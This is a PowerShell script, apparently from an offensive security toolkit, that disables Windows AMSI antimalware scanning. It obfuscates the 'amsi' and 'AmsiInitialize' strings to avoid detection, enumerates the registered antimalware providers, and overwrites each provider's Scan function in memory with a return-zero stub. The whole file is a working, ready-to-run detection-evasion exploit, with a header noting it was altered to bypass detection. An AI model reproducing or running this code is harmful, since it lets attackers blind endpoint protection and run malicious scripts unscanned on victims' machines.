<#
.SYNOPSIS
   Unchain AMS1 by patching the provider’s unmonitored memory space

   Author: Maor Korkos (@maorkor)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Unchain AMS1 by patching the provider’s unmonitored memory space
   The original POC by @maorkor has been modifyed to bypass detection

.EXAMPLE
   PS C:\> .\ScanInterception.ps1

.INPUTS
   None. You cannot pipe objects into ScanInterception.ps1

.OUTPUTS
   * Author: Maor Korkos (@maorkor)
   0
   [0] Provider's scan function found! 140732232054864
   True

.LINK
   https://github.com/deepinstinct/AMSI-Unchained/blob/main/ScanInterception_x64.ps1
   https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/ScanInterception.ps1
#>


Write-Host "`n* Author: Maor Korkos (@maorkor)" -ForegroundColor Green

$bypass = "am"+"si" -Join ''
$biosProvider = "Ams"+"iIni"+"tialize" -join ''

$Apis = @"
using System;
using System.Runtime.InteropServices;

public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("$bypass")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@

Add-Type $Apis
$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0;$i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::$biosProvider("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

#Loop through all the providers
While($AntimalwareProvider -ne 0)
{
  #Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  $i++
  #Patch the Scan function
  Write-host "Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}
write-host ""
